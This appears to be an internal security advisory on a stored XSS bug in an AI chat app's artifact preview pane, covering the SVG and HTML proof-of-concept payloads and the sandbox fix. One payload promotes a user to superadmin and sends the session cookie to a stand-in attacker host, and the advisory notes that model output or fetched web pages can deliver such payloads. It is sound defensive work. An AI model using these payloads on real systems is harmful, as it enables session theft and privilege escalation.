# R1-004 — Stored XSS via artifact preview pane

**File**: `ui/components/chat/artifact-panel.tsx`
**Severity**: High (stored XSS in admin-UI origin, fired by any model output)
**Vector**: Any LLM-generated artifact whose language is `svg` or `html`.
The artifact panel renders in the same origin as the admin UI, so the
operator's `corlinman_session` cookie is in scope. Untrusted content
includes:

  - Any chat reply that emits an SVG / HTML fenced block.
  - Summarised content from tools like `web_fetch` against an
    attacker-controlled page.
  - Re-emissions of any artifact the user previously trusted (the
    "version" mechanism overwrites the displayed source).

## PoC payloads (tested in `artifact-panel-xss.test.tsx`)

### SEC-002 — SVG `dangerouslySetInnerHTML`

```svg
<svg xmlns="http://www.w3.org/2000/svg"
     onload="globalThis.__pwned = true">
  <script>globalThis.__pwned = true;</script>
</svg>
```

Pre-fix: rendered into the parent DOM via `dangerouslySetInnerHTML`.
The `<svg>` element is inserted into the document tree of the admin UI
origin. Inline `<script>` won't run for innerHTML insertion, but the
`onload` SVG event-handler fires the moment the SVG is connected — in
parent origin — meaning the attacker gets `document.cookie`, can call
`fetch('/api/...')`, and can drive any admin endpoint as the operator.

Post-fix: routed through `<iframe sandbox="" srcDoc={…} />`. The iframe
document loads at the "null" opaque origin with **all** sandbox flags
denied (scripts, same-origin, top-navigation, form submission, popups,
modals, …). Any embedded script or event handler executes against an
isolated, scriptless origin and cannot touch the parent.

### SEC-003 — HTML iframe `allow-scripts allow-same-origin`

```html
<script>
  // Pre-fix this fires in the admin origin, with full cookie access.
  fetch('/api/admin/users/promote', {method:'POST', credentials:'include',
        body: JSON.stringify({user_id: 1, role: 'superadmin'})});
  top.location.href = 'https://evil.example/?c=' + document.cookie;
</script>
```

Pre-fix: `sandbox="allow-scripts allow-same-origin"`. Per the HTML
spec, combining these two flags causes the browser to **drop the
sandbox** when the iframe shares the embedder's origin (and srcDoc
inherits the embedder origin). The script ran with full access to
`document.cookie` (the cookie isn't `HttpOnly` for the SPA's JS-driven
API client), `fetch('/api/...')` with the session cookie, and parent
window navigation.

Post-fix: `sandbox="allow-scripts"` (the `allow-same-origin` flag is
dropped). The iframe document gets a unique opaque ("null") origin.
The script can still run for legitimate HTML-demo use, but:

  - `document.cookie` returns `""` (no cookie jar for null origin).
  - `fetch('/api/admin/...')` either targets `null` (network failure)
    or the explicit URL but **without** the session cookie, because the
    request comes from the null origin.
  - `top.location.href = ...` throws — top-navigation requires
    `allow-top-navigation` (also not granted).

## What the new sandbox string is

| Branch          | Before                                  | After             |
|-----------------|-----------------------------------------|-------------------|
| HTML preview    | `allow-scripts allow-same-origin`       | `allow-scripts`   |
| SVG preview     | `dangerouslySetInnerHTML` (no sandbox)  | `""` (empty — no flags) |

## What this fix denies

  - SVG payloads can no longer execute event handlers (`onload`,
    `onerror`, `onmouseover`, …) in the parent origin.
  - SVG payloads' inline `<script>` blocks no longer run in the parent
    origin (and in the new iframe path they run, if at all, against an
    opaque origin with no sandbox flags).
  - HTML demos retain `<script>` execution, but those scripts can no
    longer read the operator's session cookie nor make
    cookie-authenticated requests to `/api/...`.
  - HTML demos cannot navigate the top window or open escape-sandbox
    popups.

## Out of scope (queued for future hardening rounds)

  - Server-side sanitisation of artifact source on the way out of the
    chat completion stream (defence in depth).
  - CSP `frame-src` / `sandbox` hardening on the admin shell.
  - Auditing `markdown-message.tsx`'s `rehype-sanitize` chain
    independently (touched out of scope for this commit).
